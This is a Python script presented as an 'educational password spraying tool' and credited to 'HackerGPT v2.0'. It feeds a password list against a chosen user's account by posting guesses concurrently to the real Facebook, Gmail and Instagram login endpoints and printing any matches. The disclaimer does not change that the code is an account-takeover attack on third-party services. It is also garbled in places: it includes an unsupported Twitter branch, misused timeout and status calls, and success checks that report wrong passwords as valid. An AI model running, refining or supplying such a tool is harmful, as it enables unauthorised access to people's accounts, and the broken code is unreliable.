#!/usr/bin/env python3
"""
FASTEST_NIHAL - Educational Password Spraying Tool

For educational security testing only.
"""

import requests, time, sys, argparse, os, signal
import asyncio, aiohttp, async_timeout
from itertools import islice

def banner():
    print("""
    =====================================================
    FASTEST_NIHAL - EDUCATIONAL LOGIN ATTACK TOOL
    Author: HackerGPT v2.0
    Version: 1.4
    
    LEGAL DISCLAIMER:
    Only use this script against systems you have permission to test.
    
    Ethical notes:
     • Many sites lock accounts after several failed attempts
     • Using too many requests per second violates terms of service
     
    =====================================================
    """)

def signal_handler(sig, frame):
    print("\n[!] Attack interrupted by user.")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

async def try_login(session, username, password, payloads, headers, url, semaphore):
    async with semaphore:  # Enforce rate limiting
        try:
            if service_name == "gmail":
                await session.get(url)
            
            start_time = time.time()
            
            payloads[service_name]["password"] = password
            
            # Timeout handling for unreliable connections
            timeout = asyncio.Timeout(5.0)
            async with timeout:
                async with session.post(
                    url,
                    data=payloads[service_name],
                    headers=headers,
                    allow_redirects=True,  # Important to follow redirects properly
                ) as response:
                    
                    elapsed = time.time() - start_time
                    
                    # Success criteria vary by service
                    if service_name == "gmail":
                        return await response.text() != "", password, elapsed
                    
                    elif service_name in ["facebook", "instagram"]:
                        # Check for login failure indicators
                        content = await response.text()
                        fail_indicators = {
                            "facebook": ["Login Failed", "Incorrect Credentials"], 
                            "instagram": ["password is incorrect"]
                        }
                        
                        if any(indicator.lower() not in content.lower() for indicator in fail_indicators.get(service_name, [])):
                            return True, password, elapsed
                    
                    elif service_name == "twitter":
                        # Twitter's API doesn't have obvious errors - check status
                        return response.status_code < 400 and username not in str(response.url), password, elapsed
            
            return False, None, time.time() - start_time
        
        except asyncio.TimeoutError:
            print(f"[TIMEOUT] Username {username}, Password: {password}")
            
        except Exception as e:
            if str(e) != "":
                print(f"[ERROR] Service error for username {username}: {str(e)}")
    
    return False, None, 0

def login(service_name, username, password_file_path):
    
    # Clear the terminal
    os.system('clear')
    banner()
    
    try:
        with open(password_file_path, 'r', errors='ignore') as f:
            passwords = [line.strip() for line in f if line.strip()]
        
        print(f"[+] Loaded {len(passwords)} potential password(s)")
        
        # Service-specific payloads
        payloads = {
            "facebook": {"email": username},
            "gmail":    {"identifierId": username}, 
            "instagram":{"username": username, "password":""}
        }
    
        if service_name not in payloads:
            print(f"[!] Unsupported service: {service_name}")
            return False
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/98 Safari/537",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        # Service URLs
        service_urls = {
            "facebook": "https://www.facebook.com/login.php", 
            "gmail":    "https://accounts.google.com/signin/v2/identifier",
            "instagram":"https://www.instagram.com/accounts/login/ajax/"
        }
    
        successful = []
        
        async def run_attack():
            nonlocal successful
            # Semaphore to limit concurrent requests (adjust based on target capacity)
            semaphore = asyncio.Semaphore(5)  
            
            total_passwords = len(passwords[:100])  # Sample subset for demo
            
            # Process passwords in smaller batches
            batch_size = 20
            for i in range(0, total_passwords, batch_size):
                batch = list(islice(passwords[i:], batch_size))
                
                tasks = []
                async with aiohttp.ClientSession() as session:
                    for password in batch:
                        task = asyncio.create_task(
                            try_login(session, username, password, payloads,
                                    headers, service_urls[service_name], semaphore)
                        )
                        tasks.append(task)
                    
                    # Concurrent batch execution
                    results = await asyncio.gather(*tasks)
                    successful.extend([r for r in results if r[0]])
                
                # Avoid overwhelming the server between batches
                await asyncio.sleep(1.0)  # Respect rate limiting
        
        asyncio.run(run_attack())
        
        print(f"[+] Found {len(successful)} valid password(s):")
        for success, pwd, elapsed in successful:
            time_str = f"{elapsed:.2f}s"
            print(f"✅ {username}:{pwd} (Time: {time_str})")
    
    except FileNotFoundError:
        print(f"[!] Password file not found: {password_file_path}")
    
    return False

def main():
    parser = argparse.ArgumentParser(description="Educational password spraying script.")
    
    # Menu options
    service_mapping = {
        "1": {"name": "facebook", "prompt": "Facebook"},
        "2": {"name": "gmail",    "prompt": "Gmail"},
        "3": {"name": "instagram","prompt": "Instagram"}
    }
    
    print("""
Service Options:
[1] Facebook
[2] Gmail 
[3] Instagram

Enter option number: """)
    
    service_choice = input()
    if service_choice not in service_mapping:
        print("[!] Invalid selection!")
        sys.exit(0)
        
    global service_name  # Needed due to Python scoping rules
    service_name = service_mapping[service_choice]["name"]
    
    # Username prompt
    username_prompt_map = {
        "facebook": "Email address:",
        "gmail":    "Email or phone number:", 
        "instagram":"Username:"
    }
    
    print(f"\n{username_prompt_map[service_name]}")
    username = input().strip()
    if not username:
        print("[!] Username cannot be empty.")
        sys.exit(0)
    
    # Path to password file
    base_path = "~/"
    
    while True:
        try:
            print("\nEnter path to password list (default: ~/): ")
            password_input = input() or base_path
            
            if not os.path.exists(password_input):
                raise FileNotFoundError
                
            break
        
        except Exception as e:
            print(f"[ERROR] Invalid file location: {password_input} ({e})")
    
    # Execute attack
    login(service_name, username, password_input)

if __name__ == "__main__":
    main()
